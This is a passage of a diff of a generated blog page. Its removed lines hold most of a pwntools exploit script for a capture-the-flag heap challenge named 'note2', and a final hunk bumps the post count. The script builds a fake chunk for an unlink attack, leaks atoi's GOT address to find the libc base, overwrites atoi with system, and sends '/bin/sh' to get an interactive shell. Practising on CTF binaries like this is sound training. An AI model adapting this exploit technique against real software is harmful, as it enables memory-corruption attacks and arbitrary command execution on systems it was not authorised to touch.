class="params">(index,choice,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./note2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Input your name:"</span>)</span><br><span class="line">p.sendline(<span class="string">'zsh'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Input your address:"</span>)</span><br><span class="line">p.sendline(<span class="string">'sdust'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602120</span></span><br><span class="line">fd = head - <span class="number">0x18</span></span><br><span class="line">bk = head - <span class="number">0x10</span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x8</span> + p64(<span class="number">0xa0</span>) + p64(fd) + p64(bk) + <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,payload1)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">'b'</span>* <span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content is '</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\n"</span>,drop = <span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\00'</span>))</span><br><span class="line">libc_base = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">"atoi_addr is %x\n"</span> %atoi_addr)</span><br><span class="line">log.success(<span class="string">"libc_base is %x\n"</span> %libc_base)</span><br><span class="line">log.success(<span class="string">"system_addr is %x\n"</span> %system_addr)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">"option---&gt;&gt;\n"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2748,7 +2820,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
